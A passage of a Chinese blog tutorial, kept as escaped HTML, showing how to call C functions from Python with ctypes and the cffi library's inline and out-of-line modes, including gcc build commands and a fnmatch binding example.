&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Path&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">absolute&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#d88200">&amp;#34;libcadd.so&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c_lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">libname&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># define the return type&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># call the function with the correct argument types&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;In python: int: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> float &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> return val &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python3 test.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>In cadd: int &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 returning 8.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>In python: int: &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 &lt;span style="color:#00a8c8">return&lt;/span> val 8.3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png" alt="image-20211202173119818">&lt;/p>
&lt;p>可以看到成功调用了cadd.so，而我们在python中要做的只有加载.so-&amp;gt;设置符合C标准的返回值类型-&amp;gt;调用，肥肠的简单&lt;/p>
&lt;p>不过标准库ctypes有一些缺陷 并且不能拓展大型项目，鉴于此我们可以使用cffi库&lt;/p>
&lt;h4 id="cffi库">cffi库&lt;/h4>
&lt;p>这里是一个hello world的小demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 可以定义函数 结构体 变量&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int printf(const char *format, ...);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 加载c命名空间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;char[]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 即 char arg[]=&amp;#34;world&amp;#34;;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个栗子里直接在一个py文件中用cffi调用库函数就结束了，肥肠肥肠的简单；或者也可以和ctypes一样，单独写一个c先&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">Tprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello, world&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后调用&lt;code>ffi.verify()&lt;/code>在Python中加载和使用，不过还需要额外声明函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int Tadd(int a, int b);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> void Tprint(void);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int Tmul(int a, int b);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sources&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uu.c&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tprint&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png" alt="image-20211202180822923">&lt;/p>
&lt;p>以上方式都是在线api模式，cffi还支持离线api模式，比如下面这个demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> double sqrt(double x);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 需要的头文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_libmath&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> #include &amp;lt;math.h&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">library_dirs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libraries&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">verbose&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python build_cffi.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">_libmath&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">lib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 直接调用c函数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sqrt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">F&lt;/span>&lt;span style="color:#d88200">&amp;#34;The square root of 4.5 is &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python test.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png" alt="image-20211202173047579">&lt;/p>
&lt;p>可以看到这里先用一个py文件调用.h来编译生成.so和.c，然后在另一个py文件中调用.c即可&lt;/p>
&lt;p>或者还有第三种方式，在Python中使用外部已经定义好的c库函数；这里使用&lt;a href="https://github.com/wolever">wolever&lt;/a>/&lt;a href="https://github.com/wolever/python-cffi-example">python-cffi-example&lt;/a>来演示（&lt;del>就不复制粘贴了捏&lt;/del> 就粘就粘&lt;/p>
&lt;p>首先是一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18">fnmatch.h&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png" alt="image-20211202184827657">&lt;/p>
&lt;p>注意7 8 9行要改一下的，根据/usr/include/fnmatch.h改&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png" alt="image-20211202185217525">&lt;/p>
&lt;p>这是&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1">build_fnmatch.py&lt;/a>，用于生成模块在fnmatch.py中使用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi_example._fnmatch&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Since we are calling fnmatch directly no custom source is necessary. We&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># need to #include &amp;lt;fnmatch.h&amp;gt;, though, because behind the scenes cffi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># generates a .c file which contains a Python-friendly wrapper around&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ``fnmatch``:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># static PyObject *&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># _cffi_f_fnmatch(PyObject *self, PyObject *args) {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ... setup ...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># result = fnmatch(...);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># return PyInt_FromLong(result);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># }&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;#include &amp;lt;fnmatch.h&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># The important thing is to inclue libc in the list of libraries we&amp;#39;re&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># linking against:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libraries&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;fnmatch.h&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33">setup.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
